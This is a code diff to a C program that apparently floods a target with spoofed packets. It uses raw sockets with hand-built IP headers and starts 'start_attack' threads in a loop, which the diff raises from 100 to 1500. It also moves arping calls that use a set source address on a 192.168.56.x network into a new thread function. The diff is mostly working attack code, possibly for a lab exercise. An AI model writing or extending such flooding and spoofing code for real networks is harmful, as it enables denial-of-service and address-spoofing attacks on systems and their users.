@@ -17,6 +17,7 @@ void hostname_toip(char *dst, struct in_addr *dst_ip);
 char* get_local_ip();
 void start_attack(char *argv[]);
 void send_arp(char *argv[]);
+void prepare_arping(char *argv[]);
 
 int main(int argc, char *argv[])
 {
@@ -50,11 +51,6 @@ int main(int argc, char *argv[])
     ip_array[3] = argv[3];
     ip_array[4] = "192.168.56.150";
 
-    int arg_count = 9;
-    //argv[3] is for NIC to use
-    //these parameters have to be specified exactly in this order with -q in front
-    char *args[] = {"-q", "-A", "-I", argv[3], "-q","-c1", "-s", ip_array[4], "192.168.56.101"};
-    //arping_main(arg_count, args);
 
     pthread_t thread1;
 
@@ -65,7 +61,7 @@ int main(int argc, char *argv[])
         return 1;
     }
 
-    for(int i = 0; i < 100; i++)
+    for(int i = 0; i < 1500; i++)
     {
         start_attack(ip_array);
         printf("Thread %d started.\n", i);
@@ -135,6 +131,17 @@ void start_attack(char *argv[])
         //printf("Your victim is: %s\n", inet_ntoa(dst_ip));
     }
 
+    //char *args[] = {"-q", "-A", "-I", argv[3], "-q","-c1", "-s", source_ip, "192.168.56.101"};
+    //pthread_t arping_th;
+
+    //if(pthread_create(&arping_th, NULL, (void *) prepare_arping, args) < 0)
+    //{
+    //    fprintf(stderr, "Failed to create a thread for arping.\n");
+    //    exit(-1);
+    //}
+    //pthread_detach(arping_th);
+
+
     //printf("Local ip is: %s\n", source_ip);
 
     //IP header
@@ -192,6 +199,7 @@ void start_attack(char *argv[])
     if(setsockopt(sock_raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
     {
         fprintf(stderr, "Error setting up setsockopt!\n");
+        perror("Set sock options fail!\n");
         exit(-1);
     }
 
@@ -245,6 +253,15 @@ void hostname_toip(char *dst, struct in_addr *dst_ip)
 
     //I have dst_ip as a pointer here, that's why I need to pass *dst_ip
     //printf("Translated as: %s\n", inet_ntoa(*dst_ip));
+}
+
+void prepare_arping(char *argv[])
+{
+    sleep(2);
+    int arg_count = 9;
+    //argv[3] is for NIC to use
+    //these parameters have to be specified exactly in this order with -q in front
+    arping_main(arg_count, argv);
 }
 
 /*char* get_local_ip()
